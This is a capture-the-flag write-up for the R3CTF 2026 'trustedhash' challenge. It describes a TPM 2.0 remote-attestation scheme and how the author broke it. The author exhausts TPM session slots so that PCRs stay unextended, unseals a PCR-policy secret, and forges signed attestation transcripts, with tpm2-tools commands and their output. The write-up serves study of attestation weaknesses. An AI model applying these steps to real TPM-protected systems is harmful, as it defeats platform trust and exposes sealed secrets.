+++
title = 'R3CTF 2026 — trustedhash'
date = 2026-07-07T02:13:00+03:00
tags = ['ctf', 'writeup', 'misc', 'tpm2']
toc = true
tldr = 'exhausting TPM 2.0 memory slots to unseal a PCR-protected secret'
+++

## Description

> The machine is yours, but the trust is not.
> 
> &nbsp;
> 
> You are given full control of a Linux VM. A remote checker periodically sends the flag into your VM and expects it to return the correct SHA-256 hash through a trusted flow.
> 
> &nbsp;
> 
> Can you recover the flag without breaking the checker’s trust?

Attachment: [challenge.zip](challenge.zip). The full source code is provided.

## Overview

We're given the root SSH access to a qemu-based Linux VM with installed TPM 2.0 module (via swtpm simulator). The VM contains a kernel module named `trusted_hash.ko` and a systemd service `trusted-hash-agent` that's just a TCP interface to the _kernel module_. On the remote environment there is an _attester_ that periodically connects to the service and performs some kind of remote attestation. If the session is attested, the _attester_ encrypts the flag with the provided (ephemeral generated) RSA key and sends the ciphertext.

The entire flow is following:

### 0. provisioning phase

The challenge environment generates the `module_signer` and the `module_secret` values. These values are persisted to the TPM handles:

- $\mathrm{0x81010020}$ (`module_signer`), the signing RSA key with the password equals to the `module_secret` value
- $\mathrm{0x81010021}$ (`module_secret`), the RSA key password as a sealed object with auth policy based on PCR registers

Simultaneously the public key of the `module_signer` is passed to the _attester_'s config file. In the future the _attester_ will always check the `module_signer` key. This key is used to sign the session object from _kernel module_.

The public certificate of the TPM endorsement key (EK) is also saved to the _attester_'s config file.

### 1. `create_session()` phase

1. the _attester_ sends `{challenge, pcr_mask}` to the _kernel module_
2. the _kernel module_ performs the remote attestation:

- read PCR registers `{0,2,4,7,11,14}` \
  -> `pcr_digest`
- compute policy_digest \
  -> `policy_digest`
- read EK_cert \
  -> `ek_cert`
- creates attestation key (AK) \
  -> `ak_name`, `ak_public`
- creates ephemeral RSA encryption key (with `policy_digest` and random password)
- certifies the creation of ephemeral RSA key using AK \
  -> `certify_info` + `certify_signature`
- signs the transcript using `module_signer` with `module_secret` auth \
  -> `transcript_signature`

```
transcript:
label||challenge||pcr_mask||pcr_digest||policy_digest||
ak_name||ak_public||
decrypt_key_name||decrypt_key_public||
certify_info||certify_signature||
module_signer_name
```

- sends to the _attester_ the following object

```
{
  session_id,
  ek_cert, ek_public,
  pcr_digest, policy_digest, 
  ak_name, ak_public, 
  decrypt_key_name, decrypt_key_public,
  certify_info, certify_signature,
  module_signer_public, module_signer_name,
  transcript_signature
}
```

3. the _attester_ receives the given object and verifies the attestation:

- check that EK is matched to the provisioned EK
- check that AK is generated under the EK
- check that ephemeral RSA key is certified with AK
- check that ephemeral RSA key have the desired `policy_digest` policy
- check that `module_signer` key is matched to the provisioned key
- build `transcript` and check that `transcript_signature` is correct

4. if any check is failed, the _attester_ cancels the session

### 2. `activate_credential()` phase

1. the _attester_ creates the credential using the saved EK and the given AK keys

2. the _kernel module_ verifies the credential

3. if the credential is correct, the _kernel module_ activates the session

### 3. `trusted_hash()` phase

1. the _attester_ encrypts the FLAG with the given ephemeral RSA encryption key \
  -> `encryption_blob`

2. the _attester_ sends the `encryption_blob` to the _kernel module_

3. the _kernel module_ decrypts the `encryption_blob`, gets the FLAG and calculates `sha256(FLAG)` \
  -> `flag_hash`

4. the _attester_ receives the `flag_hash`

5. the _kernel module_ destroys the session and removes all transient objects

## Investigation

The entire flow of communication between _kernel module_ and _attester_ is a quite complex, let's highlight some important observations:

1. The main goal of the attestation process is to verify that the ephemeral RSA encryption key is created inside the trusted environment. It means that only the _kernel module_ have access to this key. Note that the module itself does not even have the private part of the RSA key, the key is stored securely inside the TPM.

2. The ephemeral RSA encryption key is generated with random password stored inside the kernel memory. Even if the attacker could get an access to the key, he can't use it since he does not know the password.

3. The `module_signer` and `module_secret` values are the demonstration of Trust on first use (TOFU) principle. During the setup of the fresh environment the system provides the signing key to the both participants in the atetstation protocol.

4. The key observation is that `module_secret` object is created without password authorization, only policy based on PCR. If we can unseal `module_secret`, we can get the password for `module_signer` and use it. But we can't, since PCR requirements required for unseal are unsatisfiable. During the initialization phase the _kernel module_ extends the PCR after the unsealing, so we can't get the desired values in the PCR registers later.

5. It's important to note that the entire attestation protocol is implemented correctly on both sides, there are no differences between _kernel module_ logic and _attester_ logic.

Despite this, there is an important misconfiguration that we can exploit. The attestation key (AK) is created **without any authorization** and persists in the TPM during the whole session. It means that we can hijack the attestation and certify the creation of any object, including our own _RSA encryption key_, **bypassing** the first part of the attestation protocol.

The remaining problem is the following: when we created the certified _RSA encryption key_, how to sign it with the `module_signer` key to pass the _attester_ check? We can't set PCR registers to the desired state, we can't create satisfiable policy to unseal the `module_secret`, we can't use `module_signer` key without password.

## Vulnerability

The challenge deploys swtpm TPM 2.0 simulator and connects it to the VM. As any other TPM (both hardware and software) the simulator has the configured limit of the saved sessions. When the session is created, it occupies a slot inside the TPM persistent memory. If all slots are occupied, the TPM can't create another session and returns an error. Note that saved session slots are located in the persistent TPM memory (disk), so they survive the restart.

During the initialization phase the _kernel module_ starts a policy session to unseal the `module_secret` value. When the TPM error is occured, the module just fails and **does not extend PCR registers**. But the VM remains active with fresh untouched PCR registers in TPM. If we can achieve this state, we can just compute the desired policy and **unseal the `module_secret`**.

The _kernel module_ does a TPM cleanup on exit, so we need to unload the module first and then exhaust the session slots. 

This is the key idea to solve this challenge. Let's summarize:

- we can create our certified _RSA encryption key_, since the AK persists in the TPM and created without auth
- we can unseal `module_secret` and sign the transcript object with `module_signer`
- we can pass all checks in the _attester_ during `create_session()` phase
- then we just can decrypt the FLAG during the `trusted_hash()` phase

Note that we're running as root on the VM, so we can just stop `trusted-hash-agent` service and deploy our own. It means that we can fully intercept and modify the attestation traffic between the _kernel module_ and the _attester_ (MITM).

## Solution

Let's just implement the entire attack described above.

1. unload the _kernel module_

```text
rmmod trusted_hash
```

2. create a lot of sessions to exhaust the TPM memory slots

```bash
for i in $(seq 1 100); do
  tpm2_startauthsession --policy-session -S /tmp/session_spam_$i.ctx
done
```

3. restart the VM to corrupt the _kernel module_ initialization \
Note that `reboot` command will not clear PCR registers (since the TPM is still alive), so we need to use "Restart VM" interface on the instance to trigger the restart of TPM.

```text
# dmesg | grep trusted_hash
[    2.410200] trusted_hash: loading out-of-tree module taints kernel.
[    2.555588] trusted_hash:cmd.c: Failed to start module signer policy session: -5
```

4. clear all previously created sessions

```bash
tpm2_flushcontext --saved-session
```

5. verify that PCR registers are untouched \
Note that PCR14 is zero, that's what we want to unseal the `module_secret`.

```
# tpm2_pcrread
  sha1:
  sha256:
    0 : 0xA0BFCEF4877C35AFB288F152D4F9FA7C5273E65C1DC15A1E34C8FAA0FF5AF3D3
    1 : 0x8621FDD19235C6CF86B157C523E6765BC0001A283B13EC0EA2EDB2CA16D72AC6
    2 : 0x0C086A8BA21BF3CBEEE845770A92C2131A00E79A981B035CB65407E97F5A870C
    3 : 0x3D458CFE55CC03EA1F443F1562BEEC8DF51C75E14A9FCF9A7234A13F198E7969
    4 : 0xB780B4C3448E7E91ECE11D4618DD41507ACB8CF1EEDAAC6CB03435B6492DBC3C
    5 : 0xDC7D6D06603D8C7D3DA54DE523FC9274DEE9BDE62649F6AE9EEFB43328E5EC68
    6 : 0x3D458CFE55CC03EA1F443F1562BEEC8DF51C75E14A9FCF9A7234A13F198E7969
    7 : 0xD6DF76F1A822B60F0C432E7FE62D7C88727A93C8804798ECCD14C2446DC2397F
    8 : 0x0000000000000000000000000000000000000000000000000000000000000000
    9 : 0x65AF7AEDF4C12FC626585FE47F37092E7620BFF5D0C64081307EC6656C2A3D18
    10: 0xF4894EF0A515794ED83F48051337754CDAA5EED7EFA814729D65B2DEA8ED4FC1
    11: 0xE7C702FCD0E41114993882B834080EA95DD2471FE7BF01F085455FA5C31E56EA
    12: 0x0000000000000000000000000000000000000000000000000000000000000000
    13: 0x0000000000000000000000000000000000000000000000000000000000000000
    14: 0x0000000000000000000000000000000000000000000000000000000000000000
    15: 0x0000000000000000000000000000000000000000000000000000000000000000
    16: 0x0000000000000000000000000000000000000000000000000000000000000000
    17: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
    18: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
    19: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
    20: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
    21: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
    22: 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
    23: 0x0000000000000000000000000000000000000000000000000000000000000000
  sha384:
  sha512:
```

6. create a policy session for unsealing

```
# tpm2_pcrread -o "/tmp/pcr_values.bin" "sha256:0,2,4,7,11,14"
# tpm2_createpolicy --policy-pcr -l "sha256:0,2,4,7,11,14" -f "/tmp/pcr_values.bin" -L "/tmp/policy.digest"
# tpm2_startauthsession --policy-session -S "/tmp/session.ctx"
# tpm2_policypcr -S "/tmp/session.ctx" -l "sha256:0,2,4,7,11,14" -f "/tmp/pcr_values.bin" -L "/tmp/policy.digest"
1f9320b0ba649c80e2105976b6a8bc92368d2242db917e3476404926b6f1302f
```

7. verify that policy session matches the `module_secret` policy

```
# tpm2_readpublic -c 0x81010021 | grep 'authorization policy'
authorization policy: 1f9320b0ba649c80e2105976b6a8bc92368d2242db917e3476404926b6f1302f
```

8. unseal the `module_secret` using the created policy session

```
# tpm2_unseal -c 0x81010021 -p 'session:/tmp/session.ctx' -o /tmp/secret
# base64 /tmp/secret
0+vKIOHkY7LwoAPMSTvnpmQIO8Vfg3B3ReEKh74ZiJs=
```

9. verify that we can use `module_signer`

```
# echo test | tpm2_sign -c 0x81010020 -p "$(cat /tmp/secret)" -o /tmp/signature
# base64 /tmp/signature
ABQACwEAtun2aAw1kosmPxVAgi/cZ8uPS73AUEJ+BSM5eaut43jn/yTk4p5ZIUg7oH5FgDiDqBUP
Vxm1N7srKCOweap3bEB1ICoUq64A2mMy4X69GuMukNVNB0a96xekfocgIplwId+BydU6xIEq8IUC
DvRFkUyNd4Q2yXcwW2xZVTWZjcEgqHsJpEN9SCubQa/nU3dthDervNIdOViKD3YGwkvu1bYbPCzh
b18ncsm7oI0JfBq5Qr2QDJDaNqH8hD4jCITquS4+XSufiwLHrHqczJF60miR2ZNE3kMTxOJGmBNX
HSR+aCCxFJFMlp/VoLO1neSxMO3VpwAzUYlEPITeHirLSw==
```

**We have completely compromised the attestation process**. All that remains is to setup MITM between the _kernel module_ and the _attester_, use our crafted _RSA encryption key_ and decrypt the FLAG.

## Flag

```
r3ctf{THE_v3rlflER_oWns-ThE-tRuST_bUt_Y0U-0WN-th3-ram55}
```

## Intended solution

It turns out that the solution above is unintended (the flag mentions RAM). The indended solution is hot reload forensics (dump RAM memory after the rebooting and extract the `module_secret`).

Anyway I want to thank the author [**@starcatmeow**](https://github.com/starcatmeow) for this great and fun challenge.
